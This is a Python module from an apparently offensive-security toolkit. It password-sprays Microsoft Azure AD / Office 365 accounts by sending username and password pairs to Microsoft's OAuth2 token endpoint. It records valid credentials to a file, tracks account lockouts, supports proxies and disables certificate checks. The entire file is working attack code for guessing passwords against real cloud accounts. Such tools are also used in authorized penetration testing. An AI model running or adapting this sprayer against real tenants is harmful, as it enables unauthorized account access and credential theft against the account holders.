#!/usr/bin/env python3

import json
import time
import logging
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from functools import partial
from core.utils import *
from core.colors import text_colors
from core.defaults import *
from requests.auth import HTTPBasicAuth

class OmniModule(object):

    # Counter for successful results of each task
    successful_results = 0

    def __init__(self, *args, **kwargs):
        self.type     = "spray"
        self.args     = kwargs['args']
        self.loop     = kwargs['loop']
        self.out_dir  = kwargs['out_dir']
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        self.proxies  = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        # Globally track users being sprayed so we can remove users
        # as needed
        self.users = []
        # Define locked account thresholds
        self.locked_count = 0
        self.locked_limit = 5
        # Open file handles for writing test/success cases
        self.tested_file  = ThreadWriter(SPRAY_TESTED, self.out_dir)
        self.success_file = ThreadWriter(SPRAY_FILE, self.out_dir)

    def shutdown(self, key=False):
        ''' Perform a shutdown and clean up of the asynchronous handler '''
        print()  # Print empty line
        if key:
            logging.warning("CTRL-C caught...")
        logging.info(f"Results can be found in: '{self.out_dir}'")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Let the user know the number of valid credentials identified
        logging.info(f"Valid credentials: {self.successful_results}")

        # Close the open file handles
        self.tested_file.close()
        self.success_file.close()

    async def run(self, password):
        ''' Asyncronously execute task(s) '''
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor, partial(self._execute,
                                       user=user,
                                       password=password)
            )
            for user in self.users
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def _execute(self, user, password):
        ''' Perform an asynchronous task '''
        try:
            # Task jitter
            self.args.pause()

            # --------------------------------------------------------
            # For new modules, modify the below code block logic

            # Via: https://github.com/0xZDH/o365spray/blob/master/core/handlers/sprayer.py#L232
            ''' Spray users on Microsoft using Azure AD
                https://github.com/dafthack/MSOLSpray
                https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f '''

            # Check if we hit our locked account limit, and stop
            if self.locked_count >= self.locked_limit:
                return

            # Write the tested user in its original format with the password
            # via: user:password
            self.tested_file.write(f"{user}:{password}")

            # Build/validate email
            if self.args.domain:
                user = build_email(user, self.args.domain)

            elif not check_email(user):
                logging.error(f"Invalid user: {user}")
                self.users.remove(user)
                return

            # Build user:password var for reuse with spacing
            creds = f"{user}:{password}"

            # Build custom headers
            custom_headers = HTTP_HEADERS
            custom_headers['Accept']       = 'application/json'
            custom_headers['Content-Type'] = 'application/x-www-form-urlencoded'

            # Build POST data
            data = {
                'resource':    'https://graph.windows.net',
                'client_id':   '1b730954-1685-4b74-9bfd-dac224a7b894',
                'client_info': '1',
                'grant_type':  'password',
                'username':     user,
                'password':     password,
                'scope':       'openid'
            }

            # Handle the --proxy-url flag
            if self.args.proxy_url:
                url = self.args.proxy_url

                # Ensure the custom proxy URL provided by the user includes the
                # required path
                if "/common/oauth2/token" not in url:
                    url = url.rstrip('/') + "/common/oauth2/token"

                if self.args.proxy_headers:
                    for header in self.args.proxy_headers:
                        header = header.split(':')
                        custom_headers[header[0].strip()] = ':'.join(header[1:]).strip()

            else:
                url  = "https://login.microsoft.com/common/oauth2/token"

            response = self._send_request(requests.post,
                                          url,
                                          data=data,
                                          headers=custom_headers)

            r_status = response.status_code

            if r_status == 200:
                self.successful_results += 1
                self.success_file.write(creds)
                logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {user}:{password}")
                self.users.remove(user)

            else:
                r_body = response.json()
                error  = r_body['error_description'].split('\r\n')[0]

                # Handle AADSTS errors
                for code in AADSTS_CODES.keys():
                    if code in error:
                        # This is where we handle locked accounts
                        if code == "AADSTS50053":
                            self.locked_count += 1

                        err     = AADSTS_CODES[code][0]
                        err_msg = AADSTS_CODES[code][1]
                        msg     = f" [{err}: {err_msg}]"
                        logging.info(f"{text_colors.red}[ - ]{text_colors.reset} {user}:{password}{msg}")
                        self.userlist.remove(user)
                        break

                # Only executed if the inner loop did NOT break
                else:
                    print(f"{text_colors.red}[ - ]{text_colors.reset} {user}:{password}{gen_space(creds)}", end='\r')

            # End template module code block logic.
            # --------------------------------------------------------

        except Exception as e:
            logging.debug(e)
            pass

    def _send_request(self, request, url, auth=None, data=None, json=None,
                      headers=HTTP_HEADERS, allow_redirects=False):
        ''' Template for HTTP Requests '''
        return request(url,
                       auth=auth,
                       data=data,
                       json=json,
                       headers=headers,
                       proxies=self.proxies,
                       timeout=self.args.timeout,
                       allow_redirects=allow_redirects,
                       verify=False)
